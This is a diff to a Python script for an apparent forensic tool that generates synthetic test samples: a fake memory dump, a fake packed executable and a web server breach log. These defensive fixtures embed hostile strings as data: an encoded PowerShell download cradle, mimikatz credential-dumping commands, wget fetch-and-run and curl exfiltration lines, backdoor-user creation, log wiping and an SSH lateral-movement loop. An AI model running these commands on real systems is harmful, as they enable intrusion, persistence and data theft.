@@ -235,6 +235,234 @@ def build_webshell_sample():
     print(f"  ✓ Created {path} ({len(data)} bytes)")
 
 
+def build_memory_dump():
+    """
+    Synthetic Windows memory dump with varied entropy regions.
+    Simulates: kernel (low entropy), process heap (medium), encrypted C2 traffic (high).
+    Embeds realistic forensic strings so strings/YARA tools fire too.
+    """
+    import struct
+
+    def low_entropy_block(size):
+        # Mostly NULLs + sparse printable data — kernel/empty pages
+        base = bytearray(size)
+        for i in range(0, size, 512):
+            base[i:i+4] = b'\x00\x00\x00\x00'
+        for i in range(0, size, 64):
+            base[i] = random.randint(0, 15)
+        return bytes(base)
+
+    def medium_entropy_block(size):
+        # Text-like data — process heap, stack frames, Unicode strings
+        chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 \t\r\n.,;:-_/\\'
+        return bytes(random.choices(chars, k=size))
+
+    def high_entropy_block(size):
+        # Near-random — AES-encrypted payload, packed section
+        return os.urandom(size)
+
+    def mixed_block(size):
+        # Alternating structured + random — realistic heap
+        out = bytearray()
+        chunk = 256
+        while len(out) < size:
+            if random.random() < 0.4:
+                out.extend(os.urandom(min(chunk, size - len(out))))
+            else:
+                chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 \x00'
+                out.extend(random.choices(chars, k=min(chunk, size - len(out))))
+        return bytes(out[:size])
+
+    # Forensic indicator strings scattered through memory
+    forensic_strings = [
+        # Process list artifacts
+        b'\x00' * 4 + b'System\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'smss.exe\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'csrss.exe\x00\x00\x00\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'winlogon.exe\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'services.exe\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'lsass.exe\x00\x00\x00\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'svchost.exe\x00\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'explorer.exe\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'cmd.exe\x00\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'powershell.exe\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'mimikatz.exe\x00\x00\x00\x00' + b'\x00' * 8,
+        b'\x00' * 4 + b'nc.exe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x00' * 8,
+        # Network indicators
+        b'TCP 192.168.1.105:49234 185.220.101.45:4444 ESTABLISHED\x00',
+        b'TCP 10.0.0.50:51200 91.108.4.167:443 ESTABLISHED\x00',
+        b'UDP 0.0.0.0:5355 *:* \x00',
+        b'http://185.220.101.45:8080/gate.php?id=VICTIM001&data=\x00',
+        b'https://cdn-backdoor.live/update/v3/payload.bin\x00',
+        # Credentials in memory
+        b'username=Administrator&password=P@ssw0rd123!\x00',
+        b'sekurlsa::logonpasswords\x00',
+        b'lsadump::sam\x00',
+        b'NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\x00',
+        # Registry persistence
+        b'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\x00',
+        b'C:\\Users\\victim\\AppData\\Roaming\\svchost32.exe\x00',
+        # Powershell attack
+        b'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcwBoAGUAbABsACcAKQA=\x00',
+        b'Invoke-Mimikatz -DumpCreds\x00',
+        b'IEX (New-Object Net.WebClient).DownloadString\x00',
+        # YARA trigger strings
+        b'CreateRemoteThread\x00',
+        b'VirtualAllocEx\x00',
+        b'WriteProcessMemory\x00',
+        b'NtUnmapViewOfSection\x00',
+        b'SetWindowsHookEx\x00',
+        b'GetAsyncKeyState\x00',
+    ]
+
+    out = bytearray()
+
+    # --- Region 1: Memory dump header (low entropy) ~128KB ---
+    header = bytearray(131072)
+    # Fake MDMP signature
+    header[0:4] = b'MDMP'
+    header[4:8] = struct.pack('<I', 0x0000625)   # signature
+    header[8:12] = struct.pack('<I', 0x00000007)  # version
+    out.extend(bytes(header))
+
+    # --- Region 2: Kernel structures (low entropy) ~512KB ---
+    out.extend(low_entropy_block(524288))
+
+    # Scatter some forensic strings in the low-entropy zone
+    for s in forensic_strings[:8]:
+        out.extend(low_entropy_block(2048))
+        out.extend(s)
+
+    # --- Region 3: Process heap / stack (medium entropy) ~1MB ---
+    out.extend(medium_entropy_block(524288))
+    for s in forensic_strings[8:16]:
+        out.extend(medium_entropy_block(4096))
+        out.extend(s)
+    out.extend(medium_entropy_block(524288))
+
+    # --- Region 4: Network buffer / decrypted C2 traffic (mixed) ~512KB ---
+    out.extend(mixed_block(262144))
+    for s in forensic_strings[16:24]:
+        out.extend(mixed_block(2048))
+        out.extend(s)
+    out.extend(mixed_block(262144))
+
+    # --- Region 5: Encrypted payload / injected shellcode (high entropy) ~1MB ---
+    out.extend(high_entropy_block(524288))
+    for s in forensic_strings[24:]:
+        out.extend(high_entropy_block(1024))
+        out.extend(s)
+    out.extend(high_entropy_block(524288))
+
+    # --- Region 6: More kernel / empty pages (low entropy) ~512KB ---
+    out.extend(low_entropy_block(524288))
+
+    path = os.path.join(SAMPLE_DIR, "memory_infected.vmem")
+    with open(path, "wb") as f:
+        f.write(bytes(out))
+    print(f"  ✓ Created {path} ({len(out):,} bytes, {len(out)//1024//1024:.1f} MB)")
+
+
+def build_packed_binary():
+    """High-entropy packed PE — simulates UPX/custom packer. Entropy chart goes red."""
+    mz_header = b'MZ' + b'\x90' * 58 + struct.pack('<I', 128)
+    dos_stub = b'\x00' * (128 - len(mz_header))
+    pe_sig = b'PE\x00\x00'
+    coff = struct.pack('<HHIIIHH', 0x014C, 3, 0x66000000, 0, 0, 0x00E0, 0x0102)
+    optional_header = b'\x0B\x01' + b'\x00' * 222
+
+    # UPX section headers
+    upx0 = b'UPX0\x00\x00\x00\x00' + b'\x00' * 32
+    upx1 = b'UPX1\x00\x00\x00\x00' + b'\x00' * 32
+    rsrc  = b'.rsrc\x00\x00\x00' + b'\x00' * 32
+
+    # Low-entropy stub (unpacker code)
+    stub_strings = [
+        b'UPX!\x00',
+        b'This program cannot be run in DOS mode.\r\r\n$\x00',
+        b'KERNEL32.DLL\x00',
+        b'LoadLibraryA\x00',
+        b'GetProcAddress\x00',
+        b'VirtualProtect\x00',
+        b'VirtualAlloc\x00',
+        b'ExitProcess\x00',
+        b'CreateRemoteThread\x00',
+        b'WriteProcessMemory\x00',
+        b'http://packer-c2.net/check?uid=DEMO\x00',
+        b'cmd.exe /c whoami\x00',
+        b'powershell -enc ' + b'A' * 80 + b'\x00',
+    ]
+
+    data = mz_header + dos_stub + pe_sig + coff + optional_header
+    data += upx0 + upx1 + rsrc
+
+    # Small low-entropy loader section
+    for s in stub_strings:
+        data += b'\x00' * random.randint(8, 32) + s
+
+    data += b'\x00' * 512  # section boundary
+
+    # Large high-entropy packed section (looks encrypted to scanner)
+    data += os.urandom(131072)   # 128 KB nearly-random
+
+    # Another medium section
+    mixed = bytearray()
+    for _ in range(4096):
+        mixed.extend(os.urandom(8))
+        mixed.extend(b'\x00' * random.randint(0, 8))
+    data += bytes(mixed)
+
+    # Final high-entropy block
+    data += os.urandom(65536)
+
+    path = os.path.join(SAMPLE_DIR, "packed_malware.exe")
+    with open(path, "wb") as f:
+        f.write(data)
+    print(f"  ✓ Created {path} ({len(data):,} bytes)")
+
+
+def build_exfil_log():
+    """Detailed log showing data exfiltration attack chain."""
+    lines = [
+        "2024-11-02 02:14:01 [INFO] Apache/2.4.41 POST /upload.php 200 - 10.0.0.23",
+        "2024-11-02 02:14:02 [WARN] ModSecurity: Access denied. Pattern match \"base64_decode\" in REQUEST_BODY.",
+        "2024-11-02 02:14:05 [INFO] PHP: eval() called — file=/var/www/html/upload.php line=12",
+        "2024-11-02 02:14:08 [INFO] shell_exec: 'id' → uid=33(www-data) gid=33(www-data)",
+        "2024-11-02 02:14:11 [INFO] shell_exec: 'uname -a' → Linux web01 5.4.0-182-generic #202-Ubuntu SMP",
+        "2024-11-02 02:14:15 [INFO] shell_exec: 'cat /etc/passwd'",
+        "2024-11-02 02:14:18 [INFO] shell_exec: 'find / -name \"*.pem\" -o -name \"id_rsa\" 2>/dev/null'",
+        "2024-11-02 02:14:22 [INFO] shell_exec: 'ps aux'",
+        "2024-11-02 02:14:25 [INFO] shell_exec: 'netstat -antp'",
+        "2024-11-02 02:14:30 [WARN] Outbound connection: 10.0.0.23:33010 → 91.108.4.167:443",
+        "2024-11-02 02:14:32 [INFO] curl POST https://91.108.4.167/exfil — 14.2 KB sent",
+        "2024-11-02 02:14:35 [INFO] shell_exec: 'wget http://185.220.101.45:8080/lpe.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x'",
+        "2024-11-02 02:15:01 [CRIT] Privilege escalation detected: www-data → root (CVE-2021-4034)",
+        "2024-11-02 02:15:05 [INFO] root: 'useradd -M -s /bin/bash -G sudo backdoor_user'",
+        "2024-11-02 02:15:08 [INFO] root: 'echo backdoor_user:S3cur3P@ss >> /etc/shadow'",
+        "2024-11-02 02:15:10 [INFO] root: 'crontab -l | { cat; echo \"*/5 * * * * /tmp/.x\"; } | crontab -'",
+        "2024-11-02 02:15:15 [INFO] root: 'iptables -A INPUT -s 185.220.101.45 -j ACCEPT'",
+        "2024-11-02 02:15:18 [INFO] root: 'iptables -A OUTPUT -d 185.220.101.45 -j ACCEPT'",
+        "2024-11-02 02:15:20 [INFO] root: 'tar czf /tmp/loot.tar.gz /home /var/backups /etc/nginx/ssl/'",
+        "2024-11-02 02:15:35 [INFO] Outbound transfer: /tmp/loot.tar.gz → 185.220.101.45:443 (38.7 MB)",
+        "2024-11-02 02:15:50 [INFO] root: 'rm -f /tmp/loot.tar.gz /tmp/.x /tmp/lpe.sh'",
+        "2024-11-02 02:15:52 [INFO] root: 'find /var/log -name \"*.log\" -newer /tmp/.x -delete'",
+        "2024-11-02 02:15:55 [INFO] root: 'history -c && unset HISTFILE'",
+        "2024-11-02 02:16:00 [INFO] SSH session opened: root@10.0.0.23 from 185.220.101.45 port 22",
+        "2024-11-02 02:16:05 [INFO] root: 'ssh-keygen -t rsa && cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys'",
+        "2024-11-02 02:16:10 [INFO] root: 'for h in 10.0.0.{1..254}; do ssh -o StrictHostKeyChecking=no $h id 2>/dev/null; done'",
+        "2024-11-02 02:16:45 [WARN] Lateral movement: SSH login root@10.0.0.31 from 10.0.0.23",
+        "2024-11-02 02:16:46 [WARN] Lateral movement: SSH login root@10.0.0.55 from 10.0.0.23",
+        "2024-11-02 02:16:47 [WARN] Lateral movement: SSH login root@10.0.0.101 from 10.0.0.23",
+        "2024-11-02 02:17:00 [CRIT] Ransomware behavior: mass rename *.pem→*.locked, *.db→*.locked, *.bak→*.locked",
+        "2024-11-02 02:17:05 [CRIT] Ransom note written: /var/www/html/RANSOM_NOTE.txt",
+    ]
+
+    path = os.path.join(SAMPLE_DIR, "webserver_breach.log")
+    with open(path, "w") as f:
+        f.write("\n".join(lines) + "\n")
+    print(f"  ✓ Created {path} ({len(lines)} log entries)")
+
+
 if __name__ == "__main__":
     print("ForensiX — Generating test samples...")
     print()
@@ -242,5 +470,8 @@ if __name__ == "__main__":
     build_ransomware_sample()
     build_suspicious_log()
     build_webshell_sample()
+    build_memory_dump()
+    build_packed_binary()
+    build_exfil_log()
     print()
     print("Done! All samples created in:", SAMPLE_DIR)
